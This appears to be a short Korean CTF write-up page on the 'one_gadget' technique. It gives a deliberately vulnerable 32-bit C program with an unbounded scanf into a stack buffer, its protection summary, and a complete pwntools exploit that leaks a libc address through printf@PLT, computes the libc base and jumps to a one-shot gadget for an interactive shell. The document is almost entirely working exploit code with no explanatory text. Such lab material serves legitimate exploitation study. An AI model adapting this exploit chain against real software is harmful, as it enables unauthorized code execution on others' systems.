---
title: "One-Shot Gadget (one_gadget) 활용 예시"
date: "2023-08-27"
description: "one_gadget을 이용한 libc leak → one-shot RCE 풀이 예시 — printf@PLT로 scanf@GOT 릭 후 one_gadget 점프"
tags: ["pwn", "rop", "one-gadget", "aslr", "libc", "linux"]
platform: "ctf"
category: "redteam"
difficulty: "Easy"
authors:
  - name: "Ph4nt0m"
    link: "https://github.com/Phantomn"
---

```c
#include <stdio.h>

void getMessage()
{
        char msg[200];
        printf("Enter message: ");
        scanf("%s",msg);
        // do something.
        printf("The message has been received.");
}

int main()
{
        setvbuf(stdin,0,2,0);
        setvbuf(stdout,0,2,0);
        getMessage();
        return 0;
}
```

```c
[*] '/home/phantom/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    ASLR:     On
```

```c
from pwn import *

p = process("./vuln")
e = ELF("./vuln")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'
#gdb.attach(p, "b*0x08049231")
printf_plt = e.plt['printf'] # 0x8049080
scanf_got = e.got['__isoc99_scanf'] # 0x804c018
getMessage = e.symbols['getMessage']
scanf_offset = libc.symbols['__isoc99_scanf']
oneshot= 0x1487fb
pr_eax_offset = 0x2c2d2
pr_ebp_offset = 0x1e973
got_offset = 0x1eb000
#---------------------------------------------------
payload = ''
payload += "A"*212
payload += p32(printf_plt)
payload += p32(getMessage)
payload += p32(scanf_got)
print p.recvuntil("Enter message: ")
p.sendline(payload)
print p.recvuntil("received.")
leak = u32(p.recv(4))
leak = int(leak)

#---------------------------------------------------
print "leak = ", hex(leak)
libc_base = leak - scanf_offset
print "libc_base = ",hex(libc_base)
one = libc_base + oneshot
print "one_gadget = ", hex(one)
#---------------------------------------------------

payload2 = ''
payload2 += "A"*212
payload2 += p32(libc_base + pr_eax_offset)
payload2 += p32(0x0)
payload2 += p32(libc_base + pr_ebp_offset)
payload2 += p32(libc_base + got_offset)
payload2 += p32(one)

print p.recvuntil("Enter message: ")
p.sendline(payload2)
print p.recvuntil("received.")
p.interactive()
```
